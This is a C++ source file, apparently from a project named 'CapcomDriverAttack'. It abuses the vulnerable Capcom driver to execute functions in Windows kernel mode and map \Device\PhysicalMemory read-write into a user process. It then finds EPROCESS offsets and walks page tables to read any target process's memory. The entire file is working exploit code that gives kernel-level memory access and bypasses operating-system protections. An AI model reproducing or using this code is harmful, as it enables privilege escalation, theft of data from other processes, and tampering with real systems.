#include <windows.h>
#include <winternl.h>
#include <inttypes.h>
#include <iostream>
#include <functional>  
#include "../CapcomDriverAttack/CapcomWrapper.h"
#include "../CapcomDriverAttack/CapcomLockMemory.h"

using namespace std;

#define STATUS_SUCCESS 0
#define PFN_TO_PAGE(pfn) (pfn << 12)

#pragma pack(push, 1)
typedef union CR3_ {
	uint64_t value;
	struct {
		uint64_t ignored_1 : 3;
		uint64_t write_through : 1;
		uint64_t cache_disable : 1;
		uint64_t ignored_2 : 7;
		uint64_t pml4_p : 40;
		uint64_t reserved : 12;
	};
} PTE_CR3;

typedef union VIRT_ADDR_ {
	uint64_t value;
	void *pointer;
	struct {
		uint64_t offset : 12;
		uint64_t pt_index : 9;
		uint64_t pd_index : 9;
		uint64_t pdpt_index : 9;
		uint64_t pml4_index : 9;
		uint64_t reserved : 16;
	};
} VIRT_ADDR;

typedef uint64_t PHYS_ADDR;

typedef union PML4E_ {
	uint64_t value;
	struct {
		uint64_t present : 1;
		uint64_t rw : 1;
		uint64_t user : 1;
		uint64_t write_through : 1;
		uint64_t cache_disable : 1;
		uint64_t accessed : 1;
		uint64_t ignored_1 : 1;
		uint64_t reserved_1 : 1;
		uint64_t ignored_2 : 4;
		uint64_t pdpt_p : 40;
		uint64_t ignored_3 : 11;
		uint64_t xd : 1;
	};
} PML4E;

typedef union PDPTE_ {
	uint64_t value;
	struct {
		uint64_t present : 1;
		uint64_t rw : 1;
		uint64_t user : 1;
		uint64_t write_through : 1;
		uint64_t cache_disable : 1;
		uint64_t accessed : 1;
		uint64_t dirty : 1;
		uint64_t page_size : 1;
		uint64_t ignored_2 : 4;
		uint64_t pd_p : 40;
		uint64_t ignored_3 : 11;
		uint64_t xd : 1;
	};
} PDPTE;

typedef union PDE_ {
	uint64_t value;
	struct {
		uint64_t present : 1;
		uint64_t rw : 1;
		uint64_t user : 1;
		uint64_t write_through : 1;
		uint64_t cache_disable : 1;
		uint64_t accessed : 1;
		uint64_t dirty : 1;
		uint64_t page_size : 1;
		uint64_t ignored_2 : 4;
		uint64_t pt_p : 40;
		uint64_t ignored_3 : 11;
		uint64_t xd : 1;
	};
} PDE;

typedef union PTE_ {
	uint64_t value;
	VIRT_ADDR vaddr;
	struct {
		uint64_t present : 1;
		uint64_t rw : 1;
		uint64_t user : 1;
		uint64_t write_through : 1;
		uint64_t cache_disable : 1;
		uint64_t accessed : 1;
		uint64_t dirty : 1;
		uint64_t pat : 1;
		uint64_t global : 1;
		uint64_t ignored_1 : 3;
		uint64_t page_frame : 40;
		uint64_t ignored_3 : 11;
		uint64_t xd : 1;
	};
} PTE;
#pragma pack(pop)

typedef LARGE_INTEGER PHYSICAL_ADDRESS, *PPHYSICAL_ADDRESS;
typedef struct _PHYSICAL_MEMORY_RANGE {
	PHYSICAL_ADDRESS BaseAddress;
	LARGE_INTEGER NumberOfBytes;
} PHYSICAL_MEMORY_RANGE, *PPHYSICAL_MEMORY_RANGE;

PUCHAR physicalMemoryBegin = NULL;
SIZE_T physicalMemorySize;

uint64_t currentEProcess;
uint64_t currentDirectoryBase;
uint64_t targetDirectoryBase;

uint64_t uniqueProcessIdOffset;
uint64_t activeProcessLinksOffset;
uint64_t directoryTableBaseOffset;

struct PageTableInfo {
    PML4E* Pml4e;
    PDPTE* Pdpte;
    PDE* Pde;
    PTE* Pte;
};

/** Windows Kernel Function pointers **/

NON_PAGED_DATA static kernelFuncCall ExAllocatePool;
NON_PAGED_DATA static kernelFuncCall PsGetCurrentProcess;
NON_PAGED_DATA static kernelFuncCall PsGetProcessId;
NON_PAGED_DATA static kernelFuncCall ZwOpenSection;
NON_PAGED_DATA static kernelFuncCall ZwMapViewOfSection;
NON_PAGED_DATA static kernelFuncCall ZwClose;
NON_PAGED_DATA PPHYSICAL_MEMORY_RANGE(NTAPI* MmGetPhysicalMemoryRanges)(void);

/** Functions executed in kernel mode **/

NON_PAGED_CODE void __stdcall InitKernelFunctions(MmGetSystemRoutineAddress_t pMmGetSystemRoutineAddress, PVOID userData) {
    ExAllocatePool = (kernelFuncCall)GetKernelRoutine(pMmGetSystemRoutineAddress, L"ExAllocatePool");
    PsGetCurrentProcess = (kernelFuncCall)GetKernelRoutine(pMmGetSystemRoutineAddress, L"PsGetCurrentProcess");
    PsGetProcessId = (kernelFuncCall)GetKernelRoutine(pMmGetSystemRoutineAddress, L"PsGetProcessId");
    ZwOpenSection = (kernelFuncCall)GetKernelRoutine(pMmGetSystemRoutineAddress, L"ZwOpenSection");
    ZwMapViewOfSection = (kernelFuncCall)GetKernelRoutine(pMmGetSystemRoutineAddress, L"ZwMapViewOfSection");
    ZwClose = (kernelFuncCall)GetKernelRoutine(pMmGetSystemRoutineAddress, L"ZwClose");
    MmGetPhysicalMemoryRanges = (decltype(MmGetPhysicalMemoryRanges))GetKernelRoutine(pMmGetSystemRoutineAddress, L"MmGetPhysicalMemoryRanges");
}

// NON_PAGED_CODE void __stdcall GetEProcessOffsets(MmGetSystemRoutineAddress_t pMmGetSystemRoutineAddress, PVOID userData) {
//     currentEProcess = PsGetCurrentProcess();
//     currentDirectoryBase = __readcr3();
//     uint64_t pid = PsGetProcessId(currentEProcess);
//     uint32_t pidOffset = *(uint32_t*)((PUCHAR)PsGetProcessId + 3);
//     if (pidOffset < 0x400 && *(uint64_t*)(currentEProcess + pidOffset) == pid) {
//         uniqueProcessIdOffset = pidOffset;
//         activeProcessLinksOffset = uniqueProcessIdOffset + 0x8;
//     }

//     for (int i = 0; i < 0x400; i += 0x8) {
//         uint64_t* ptr = (uint64_t*)(currentEProcess + i);
//         if (!uniqueProcessIdOffset && ptr[0] & 0xFFFFFFFF == pid && (ptr[1] > 0xffff800000000000) && (ptr[2] > 0xffff800000000000) && ((ptr[1] & 0xF) == (ptr[2] & 0xF))) {
//             uniqueProcessIdOffset = i;
//             activeProcessLinksOffset = uniqueProcessIdOffset + 0x8;
//         } else if (directoryTableBaseOffset && ptr[0] == __readcr3()) {
//             directoryTableBaseOffset = i;
//         }
//     }
// }

NON_PAGED_CODE void __stdcall GetPhysicalMemoryData(MmGetSystemRoutineAddress_t pMmGetSystemRoutineAddress, PVOID userData) {
    wchar_t physicalMemoryName[] = L"\\Device\\PhysicalMemory";
	OBJECT_ATTRIBUTES physicalMemoryAttributes;
	UNICODE_STRING physicalMemoryNameUnicode;
    physicalMemoryNameUnicode.Buffer = physicalMemoryName;
	physicalMemoryNameUnicode.Length = sizeof(physicalMemoryName) - 2;
	physicalMemoryNameUnicode.MaximumLength = sizeof(physicalMemoryName);

	physicalMemoryAttributes.Length = sizeof(physicalMemoryAttributes);
	physicalMemoryAttributes.Attributes = OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE;
	physicalMemoryAttributes.ObjectName = &physicalMemoryNameUnicode;
	physicalMemoryAttributes.RootDirectory = 0;
	physicalMemoryAttributes.SecurityDescriptor = 0;
	physicalMemoryAttributes.SecurityQualityOfService = 0;

    PPHYSICAL_MEMORY_RANGE range = MmGetPhysicalMemoryRanges();
    while (range->NumberOfBytes.QuadPart) {
        physicalMemorySize = max(physicalMemorySize, range->BaseAddress.QuadPart + range->NumberOfBytes.QuadPart);
        range++;
    }

    HANDLE physicalMemoryHandle = NULL;
    
    NTSTATUS status = CallWithInterruptsAndSmep(
        ZwOpenSection, 
        &physicalMemoryHandle, 
        uint64_t(SECTION_ALL_ACCESS), 
        &physicalMemoryAttributes
    );

    if (status == STATUS_SUCCESS) {

        status = CallWithInterruptsAndSmep(
            ZwMapViewOfSection,
            physicalMemoryHandle, 
            NtCurrentProcess(), 
            &physicalMemoryBegin, 
            0ull, 
            0ull, 
            0ull, 
            &physicalMemorySize, 
            1ull,
            0, 
            PAGE_READWRITE
        );

        if (status == STATUS_SUCCESS) {
            currentEProcess = PsGetCurrentProcess();
            currentDirectoryBase = __readcr3();
            uint64_t pid = PsGetProcessId(currentEProcess);
            uint32_t pidOffset = *(uint32_t*)((PUCHAR)PsGetProcessId + 3);
            if (pidOffset < 0x400 && *(uint64_t*)(currentEProcess + pidOffset) == pid) {
                uniqueProcessIdOffset = pidOffset;
                activeProcessLinksOffset = uniqueProcessIdOffset + 0x8;
            }

            for (int i = 0; i < 0x400; i += 0x8) {
                uint64_t* ptr = (uint64_t*)(currentEProcess + i);
                if (!uniqueProcessIdOffset && ptr[0] & 0xFFFFFFFF == pid && (ptr[1] > 0xffff800000000000) && (ptr[2] > 0xffff800000000000) && ((ptr[1] & 0xF) == (ptr[2] & 0xF))) {
                    uniqueProcessIdOffset = i;
                    activeProcessLinksOffset = uniqueProcessIdOffset + 0x8;
                } else if (!directoryTableBaseOffset && ptr[0] == __readcr3()) {
                    directoryTableBaseOffset = i;
                }
            }
        }
    }
    ZwClose(physicalMemoryHandle);
}

/** Usermode API functions **/

template<typename T> T& ReadPhysicalUnsafe(uint64_t pa) {
    return *(T*)(physicalMemoryBegin + pa);
}

PageTableInfo QueryPageTableInfo(PVOID va) {
    PageTableInfo Pi = { 0,0,0,0 };

    VIRT_ADDR Addr = { (uint64_t) va };
    PTE_CR3 Cr3 = { targetDirectoryBase };

    {
        uint64_t a = PFN_TO_PAGE(Cr3.pml4_p) + sizeof(PML4E) * Addr.pml4_index;
        if (a > physicalMemorySize)
            return Pi;
        PML4E& e = ReadPhysicalUnsafe<PML4E>(a);
        if (!e.present)
            return Pi;
        Pi.Pml4e = &e;
    }
    {
        uint64_t a = PFN_TO_PAGE(Pi.Pml4e->pdpt_p) + sizeof(PDPTE) * Addr.pdpt_index;
        if (a > physicalMemorySize)
            return Pi;
        PDPTE& e = ReadPhysicalUnsafe<PDPTE>(a);
        if (!e.present)
            return Pi;
        Pi.Pdpte = &e;
    }
    {
        uint64_t a = PFN_TO_PAGE(Pi.Pdpte->pd_p) + sizeof(PDE) * Addr.pd_index;
        if (a > physicalMemorySize)
            return Pi;
        PDE& e = ReadPhysicalUnsafe<PDE>(a);
        if (!e.present)
            return Pi;
        Pi.Pde = &e;
        if (Pi.Pde->page_size)
            return Pi;
    }
    {
        uint64_t a = PFN_TO_PAGE(Pi.Pde->pt_p) + sizeof(PTE) * Addr.pt_index;
        if (a > physicalMemorySize)
            return Pi;
        PTE& e = ReadPhysicalUnsafe<PTE>(a);
        if (!e.present)
            return Pi;
        Pi.Pte = &e;
    }
    return Pi;
}

uint64_t VirtToPhys(PVOID va) {
    auto info = QueryPageTableInfo(va);

    if (!info.Pde) {
        return 0;
    }

    uint64_t pa = 0;

    if (info.Pde->page_size) {
        pa = PFN_TO_PAGE(info.Pde->pt_p);
        pa += (uint64_t) va & (0x200000 - 1);
    }
    else {
        if (!info.Pte) {
            return 0;
        }
        pa = PFN_TO_PAGE(info.Pte->page_frame);
        pa += (uint64_t) va & (0x1000 - 1);
    }
    return pa;
}

void IterPhysRegion(PVOID startVa, SIZE_T size, std::function<void(PVOID va, uint64_t, SIZE_T)> Func) {
    PUCHAR it = (PUCHAR)startVa;
    PUCHAR end = it + size;

    while (it < end) {
        SIZE_T size = (PUCHAR) (((uint64_t) it + 0x1000) & (~0xFFF)) - it;

        if ((it + size) > end) {
            size = end - it;
        }

        uint64_t pa = VirtToPhys(it);

        Func(it, pa, size);

        it += size;
    }
}

SIZE_T ReadVirtual(PVOID src, PVOID dst, SIZE_T size) {
    PUCHAR it = (PUCHAR) dst;
    SIZE_T bytesRead = 0;

    IterPhysRegion(src, size, [&](PVOID va, uint64_t pa, SIZE_T sz) {
        if (pa) {
            bytesRead += sz;
            memcpy(it, physicalMemoryBegin + pa, sz);
            it += sz;
        }
    });

    return bytesRead;
}

template<typename T>
T ReadVirtual(PVOID from) {
    char buffer[sizeof(T)];
    ReadVirtual(from, buffer, sizeof(T));
    return *(T*)(buffer);
}

void SetTargetEProcess(uint64_t eProcess) {
    targetDirectoryBase = ReadVirtual<uint64_t>((PUCHAR)eProcess + directoryTableBaseOffset);
}

void UnsetEProcess() {
    targetDirectoryBase = currentDirectoryBase;
}

BOOL InitMemoryController() {

    if (!LockMemorySections()) {
        return FALSE;
    }

    if (!InitDriver()) {
        return FALSE;
    }
    RunInKernel(InitKernelFunctions, NULL);
    RunInKernel(GetPhysicalMemoryData, NULL);
    if (!physicalMemoryBegin || !physicalMemorySize) {
        return FALSE;
    }
    // RunInKernel(GetEProcessOffsets, NULL);
    if (!uniqueProcessIdOffset || !activeProcessLinksOffset) {
        return FALSE;
    }
    targetDirectoryBase = currentDirectoryBase;


    printf("physicalMemoryBegin: %16llx\n", (uint64_t)physicalMemoryBegin);
    printf("physicalMemorySize:  %16llx\n", physicalMemorySize);
    printf("CurrentProcessCr3:   %16llx\n", currentDirectoryBase);
	printf("CurrentEProcess:     %16llx\n", currentEProcess);

	printf("DirectoryTableBase  %16llx\n", directoryTableBaseOffset);
	printf("UniqueProcessId     %16llx\n", uniqueProcessIdOffset);
	printf("ActiveProcessLinks  %16llx\n", activeProcessLinksOffset);

    return TRUE;
}

